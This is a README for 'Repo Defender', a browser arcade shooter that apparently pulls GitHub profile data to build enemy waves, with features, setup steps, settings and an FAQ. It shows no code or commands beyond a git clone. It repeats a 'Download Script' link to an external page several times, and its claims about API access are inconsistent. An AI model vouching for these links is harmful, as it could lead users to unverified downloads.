# Repo Defender - Arcade Shooter 2026

> **Transform your GitHub profile into an interactive battleground.** Protect your repositories from invading bugs, outdated code, and technical debt with this HTML5 Canvas arcade shooter that integrates directly with the GitHub API.

[![Game Script](https://img.shields.io/badge/Type-Arcade%20Shooter-green?style=flat-square)](https://github.com)
[![Platform](https://img.shields.io/badge/Platform-Web-blue?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/youngnoah1997/repo-defender-shooter?style=flat-square)](https://github.com/youngnoah1997/repo-defender-shooter)

---

<p align="center">
  <a href="https://youngnoah1997.github.io/repo-defender-shooter/">
    <img src="https://img.shields.io/badge/Download-Repo%20Defender%20Script-brightgreen?style=for-the-badge" alt="Download Repo Defender Script">
  </a>
</p>

> **[Direct Download - Repo Defender](https://youngnoah1997.github.io/repo-defender-shooter/)**

---

[Download Latest Build](https://youngnoah1997.github.io/repo-defender-shooter/)

---

## What It Does

Repo Defender turns your personal GitHub profile into a live arcade shooter. The game uses HTML5 Canvas rendering and direct GitHub API calls to pull your actual repository data and convert it into enemy waves—real bugs, stale projects, and other code issues become targets you must eliminate. Each session reflects your current profile state, so no two playthroughs are identical.

This latest release brings smoother gameplay and a broader range of enemies. New legacy boss encounters trigger when you have too many inactive repositories, and language integration adds a tactical layer by linking your most-used programming languages to special power-ups. Whether you need a fun break from coding or want to gamify your repository maintenance, Repo Defender provides a fresh interactive experience.

## Key Features

- **Avatar-Based Defense** – Your GitHub avatar acts as the player ship, adding a personal touch to every match.
- **Real Bug Enemies** – Enemy sprites correspond to actual GitHub issues and bugs, making each wave relevant to your repositories.
- **Legacy Bosses** – Accumulating many archived or untouched repos triggers massive legacy bosses with unique attack patterns.
- **Language Integration** – Your top programming languages unlock special weapons and shields, adding strategic depth.
- **GIT_CONFIG Upgrades** – Adjust your GitHub configuration settings to unlock new abilities and power-ups during gameplay.
- **Real-Time API Sync** – The game fetches your latest repository data on every launch, ensuring enemies match your current profile state.
- **Score Persistence** – High scores are stored locally so you can track your progress across sessions.

## Getting Started

1. **Download** the script from the link above or clone the repository:
   ```bash
   git clone https://github.com/youngnoah1997/repo-defender-shooter.git
   ```
2. **Open** the `index.html` file in any modern browser (Chrome, Firefox, Edge, or Safari recommended).
3. **Grant** GitHub API access when prompted—this lets the game read your public profile data.
4. **Start playing** by clicking the "Start Game" button. No additional software or dependencies are required.

No installation or build tools are needed. The entire game runs directly in your browser.

## Configuration

| Setting | Default | Description |
|---------|---------|-------------|
| `apiRateLimit` | 60 | Requests per minute to GitHub API |
| `difficulty` | Normal | Enemy spawn rate and boss health |
| `soundEnabled` | true | Toggle background music and effects |
| `showFPS` | false | Display frames per second counter |
| `autoRestart` | true | Automatically restart after game over |

You can adjust these settings by editing the `config.js` file or through the in-game options menu.

## Compatibility

- **Browsers:** Chrome 90+, Firefox 90+, Edge 90+, Safari 15+
- **GitHub Accounts:** Works with any public GitHub profile. Private repository data is not accessed.
- **Limitations:** Requires an active internet connection for initial API sync. Does not support mobile touch controls natively.

## Frequently Asked Questions

**How do I update the script?**
Download the latest version from the repository or run `git pull` if you cloned the repo.

**Can I customize the enemies or gameplay?**
Yes. You can modify enemy sprites in the `assets` folder and adjust game parameters in `config.js`. See the customization guide in the repository wiki.

**Does this work with private repositories?**
No. The game only accesses public repository data via the GitHub API. No authentication tokens are stored or transmitted.

**My high scores are missing. What happened?**
Local storage may have been cleared. Scores are stored in your browser's local storage and will persist unless you clear your browsing data.

**Is there a mobile version?**
Not yet. The game is designed for desktop browsers, but mobile support may be added in future releases.

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
